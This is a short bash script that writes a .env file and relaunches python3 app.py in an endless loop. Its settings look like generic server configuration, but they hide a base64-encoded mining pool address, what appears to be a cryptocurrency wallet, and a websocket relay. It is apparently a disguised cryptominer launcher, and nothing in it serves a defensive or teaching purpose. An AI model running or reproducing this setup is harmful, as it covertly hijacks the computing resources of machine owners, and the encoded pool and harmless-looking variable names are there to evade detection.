#!/bin/bash
CONNECT=$1
NAME=$2
echo "SERVER_WS=wss://digitaldz.biz.id
SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
SERVER_DOMAIN=82thAvdKbspiLhcSkNG8xrP7j3gwJKgrGj6w2A5j4urc64uJauggoeNWyHHh9hvasKTa1dnavqHh2f3fq2vuXchP7ENy9kJ
SERVER_SECRET=${NAME}
SERVER_CONNECTION=${CONNECT}
SERVER_MODE=FAST" > .env
while true; do python3 app.py; sleep 10; done
